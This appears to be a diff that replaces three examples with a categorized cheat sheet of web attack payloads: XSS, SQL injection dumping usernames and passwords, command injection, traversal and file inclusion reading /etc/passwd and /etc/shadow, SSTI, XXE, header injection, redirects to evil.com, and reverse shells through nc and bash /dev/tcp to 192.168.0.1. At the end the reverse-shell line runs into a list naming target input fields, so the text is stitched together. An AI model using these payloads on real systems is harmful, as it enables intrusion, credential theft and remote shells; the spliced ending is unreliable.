@@ -1,8 +1,79 @@
-1. XSS payload: 
-<script>alert('XSS vulnerability')</script>
 
-2. SQL Injection payload: 
-' OR 1=1;--
 
-3. Directory Traversal payload: 
-../../../../../../../../../../../../etc/passwd
+
+
+
+
+# XSS Payloads
+<script>alert(1)</script>
+"><svg onload=alert(1)>
+<iframe src="javascript:alert('XSS')">
+<img src="x" onerror="alert('XSS')">
+<svg><script>alert(String.fromCharCode(88,83,83))</script>
+
+# SQL Injection
+' OR '1'='1
+" OR "1"="1
+admin' --
+' OR 1=1--
+' UNION SELECT NULL, NULL, NULL--
+') OR ('1'='1
+' AND 1=0 UNION ALL SELECT username, password FROM users--
+
+# Command Injection
+; ls -la
+&& whoami
+| cat /etc/passwd
+$(id)
+`id`
+
+# Directory Traversal
+../../../../etc/passwd
+..\\..\\..\\..\\windows\\win.ini
+/etc/shadow
+../../../../../../../../../etc/hosts
+/var/www/html/../../../etc/passwd
+
+# Local File Inclusion (LFI)
+../../../../etc/passwd%00
+../../../../../../etc/hosts
+../../../../../../boot.ini
+../../../../../../etc/shadow
+php://filter/convert.base64-encode/resource=index.php
+
+# Server-Side Template Injection (SSTI)
+{{7*7}}
+{{config.items()}}
+<%= 7 * 7 %>
+${7*7}
+{{''.__class__.__mro__[1].__subclasses__()}}
+
+# HTTP Header Injection
+%0d%0aSet-Cookie:%20admin=true
+%0aContent-Length:0
+%0d%0aLocation:%20https://evil.com
+
+# Open Redirect
+https://target.com/redirect?url=https://evil.com
+//evil.com
+///evil.com
+
+# XXE Payloads
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>
+
+# CRLF Injection
+%0d%0aSet-Cookie:%20SessionID=malicious
+
+# Basic RCE
+; nc -e /bin/sh 192.168.0.1 4444
+; bash -i >& /dev/tcp/192.168.0.1/4444 0>&11. For XSS vulnerability:
+Payload: <script>alert('XSS')</script>
+Location: Input field for feedback on the Contact Us page
+
+2. For SQL Injection vulnerability:
+Payload: ' OR '1'='1
+Location: Input field for searching on the website
+
+3. For Directory Traversal vulnerability:
+Payload: ../../../../../../../../etc/passwd
+Location: URL bar for searching locations on the website
